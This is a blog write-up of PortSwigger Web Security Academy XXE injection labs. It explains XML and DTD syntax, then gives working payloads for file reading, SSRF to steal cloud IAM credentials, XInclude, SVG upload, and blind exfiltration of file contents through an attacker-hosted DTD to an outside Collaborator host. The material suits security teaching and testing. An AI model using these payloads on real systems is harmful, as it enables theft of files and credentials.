---
date: 2021-09-16 23:48:05
layout: post
title: XML external external (XXE) injection Vulnerabilities
subtitle: PortSwigger Writeup.
description: >-
  in this blog i've explained how to XML external external (XXE) injection Vulnerabilities and labs in PortSwigger
image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/b1f7666da9eebbfcbb9a38975f4aca3888054687/assets/img/XXE/xxe-injection.svg
optimized_image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/b1f7666da9eebbfcbb9a38975f4aca3888054687/assets/img/XXE/xxe-injection.svg
category: PortSwigger
tags:
  - PortSwigger
  - injection
author: Mahmoud S. Atia
paginate: true
---







![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/1248c7cc8575cfe699097161848825ca2c19a231/assets/img/XXE/xxe-injection.svg)

------------

# Note

I'll explain what XML is, describe how XXE vulnerabilities can be detected and exploited.

------------

# What is XML?
XML (eXtensible Markup Language) is a  markup language that defines a set of rules for encoding documents in a  format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

------------

# XML uses

There are many fields of use that leverage XML. These include PDF, RSS, OOXML (.docx, .pptx, etc.), SVG , and finally networking protocols, such as XMLRPC, SOAP, WebDAV and so many others.

------------

# Why do we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3.  XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

------------

# Syntax
Every XML document mostly starts with what is known as XML Prolog.

`<?xml version="1.0" encoding="UTF-8"?>`

 &darr; &darr; &darr;

 the line is called XML prolog and it specifies the XML version and the  encoding used in the XML document. This line is not compulsory to use  but it is considered a
 `good practice` to put that line in all your XML  documents.Every XML document must contain a `ROOT` element.Ex:

`<?xml version="1.0" encoding="UTF-8"?><mail>   <to>falcon</to>   <from>feast</from>   <subject>About XXE</subject>   <text>Teach about XXE</text></mail>`

In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be considered `wrong` or `invalid` XML doc. Another thing to remember is that XML is a case-sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`( notice the capitalization of `T`) Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML.Ex:`<text category = "message">You need to learn about XXE</text>`

In the above example `category` is the attribute name and `message` is the attribute value.

------------

# XXE Attacks 

1. XML TAG Injection
2. XML External Entities
3. XML Entities Expansion
4. XPath Injection

#  Document Type Definition (DTD)

used to define the legal building blocks of an XML document and make sure that the XML file conforms to the rules of that DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>H3X0S3</to>
    <from>BinSl7</from>
    <heading>Hacking</heading>
    <body>XXE Attack</body>
</note>

```

- **!DOCTYPE note** defines that the root element of this document is note
- **!ELEMENT note** defines that the note element must contain four elements: ` to,from,heading,body`
- **!ELEMENT to** defines the to element to be of type "#PCDATA"
- **!ELEMENT from** defines the from element to be of type "#PCDATA"
- **!ELEMENT heading** defines the heading element to be of type "#PCDATA"
- **!ELEMENT body** defines the body element to be of type "#PCDATA"

&rarr; `we can define our entities as html encode`

in case we need to extract php file content we need special attack to avoid 
Meta-characters: `' " < > &` 
so we will use (php:// built-in wrapper)
[More about php wrapper](https://www.php.net/manual/en/wrappers.php.php](http:// "More about php wrapper")

&rarr; `php://filter`
This is a kind of meta-wrapper designed to convert the application filters to a stream at the time of opening.
In order to avoid XML parsing errors, we need a filter that reads files from the target and then converts the content into a format that is
harmless to the XML structure using `Base64` to encode the target content.
```xml
<!DOCTYPE message [
...
<!ENTITY Binsl7 SYSTEM "php://filter/read=convert.base64-encode/resource=file:///path/to/config.php">]>
<message>
H3X0S3
<body>&Binsl7;</body>
</message>
```

------------

# Lab: Exploiting XXE using external entities to retrieve files
we need to read /etc/passwd 
access the lab and go to check stock feature then inject the payload 
we will use file protocol to read file 
[List of URI schemes ](https://en.wikipedia.org/wiki/List_of_URI_schemes "List of URI schemes ")
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Exploiting-XXE-using-external-entities-to-retrieve-files-1.png
 Labe Solved

------------

# Lab: Exploiting XXE to perform SSRF attacks

in this lab is valarble to ssrf attack so we wiil use xml payload injection to exploit ssrf 

**Note** The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is [http://169.254.169.254/](http://169.254.169.254/). This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

we need to obtain the server's IAM secret access key from the EC2 metadata endpoint

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XXE-to-perform-SSRF-attacks-1.png)

In the response give us "Invalid product ID: latest" `latest` in the next sub-folder in the directory so we will add it to our payload 

```xml
<!DOCTYPE H3X0S3 [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XXE-to-perform-SSRF-attacks-2.png)



In the response give us "Invalid product ID: meta-data" `meta-data` in the next sub-folder in the directory so we will add it to our payload. so on 
our last payload is

```xml
<!DOCTYPE test [ <!ENTITY H3X0S3 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"> ]>
```

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XXE-to-perform-SSRF-attacks-3.png)

Labe Solved

------------

# Lab: Exploiting XInclude to retrieve files

> Note:  This lab has a "Check stock" feature that embeds the user  input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

```xml
<foo xmlns:xsi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XInclude-to-retrieve-files-1.png)



in response 

"XML parser exited with non-zero code 1: The prefix "xi" for element "xi:include" is not bound.
"

tell use to use xi as perfix for xi:incude so or payload will be

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```


> The xmlns attribute specifies the xml namespace for a document.


![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XInclude-to-retrieve-files-2.png)

Labe Solved

------------

# Lab: Exploiting XXE via image file upload

we need to read /etc/hostname file throw svg file injected with our payload. creat the payload contain xml code injected with 

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
```

payload will be

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY H3X0S3 SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&H3X0S3;</text></svg>
```

[standalone=yes](https://forums.asp.net/t/1799986.aspx?what+does+standalone+yes+mean "standalone=yes")

go to type any comment and upload the svg file and return to view the avatar 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XXE-via-image-file-upload.png)

Labe Solved

------------

# Lab: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.
So we will use  burpcollaborator

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "[http://dwd4kff0i8sagjltnzc0qz4vwm2cq1.burpcollaborator.net](http://dwd4kff0i8sagjltnzc0qz4vwm2cq1.burpcollaborator.net/)"> ]>
```

stockcheck as element
xxe as ENTITY 

payload as

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "[http://dwd4kff0i8sagjltnzc0qz4vwm2cq1.burpcollaborator.net](http://dwd4kff0i8sagjltnzc0qz4vwm2cq1.burpcollaborator.net/)"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

forward the request

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Blind-XXE-with-out-of-band-interaction.png)

Labe Solved

------------

# Lab: Blind XXE with out-of-band interaction via XML parameter entities

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 
so open  Burp Collaborator client then Click Copy to clipboard
make our payload
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "[http://ciyu5iq9djdf7wan1drm6dxjqaw0kp.burpcollaborator.net]"> %xxe; ]>
```


**Note we use % to escap Parameter Entities**

Go back to the Burp Collaborator client window, and click Poll now 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities.png)


------------

# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

go to exploit server to host our our malicious external file dtd 

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM '[http://mukd1rvbfn9dwspq32ozmuo9g0mqaf.burpcollaborator.net/?x=%file;](http://mukd1rvbfn9dwspq32ozmuo9g0mqaf.burpcollaborator.net/?x=%25file;)'>">
%eval;
%exfil;
```

**our payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "[https://exploit-aca01f131ef69bb88016478a013700bc.web-security-academy.net/exploit.dtd](https://exploit-aca01f131ef69bb88016478a013700bc.web-security-academy.net/exploit.dtd)"> %xxe;]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD.png)

we will find 
> 9f6f497e5093

submit the solution

Labe Solved

------------

# Lab: Exploiting blind XXE to retrieve data via error messages

go to exploit server

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

to host the malicious code to retrieve on our BurpSuite

put it in request

```bash
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

replace YOUR-DTD-URL with your exploit DTD url so it will be 

```bash
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac431fd81ed49e85800965b0015a00b6.web-security-academy.net/exploit"> %xxe;]>
```
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-blind-XXE-to-retrieve-data-via-error-messages.png)

Labe Solved

------------

# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

```bash
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

&#x25 decode % 

&#x26 decode &

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD.png)

Labe Solved

-------------------

𝕊𝔼𝔼 𝕐𝕆𝕌 𝕀ℕ ℕ𝔼𝕏𝕋 𝔹𝕃𝕆𝔾

-------------------
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/XXE/End.gif)
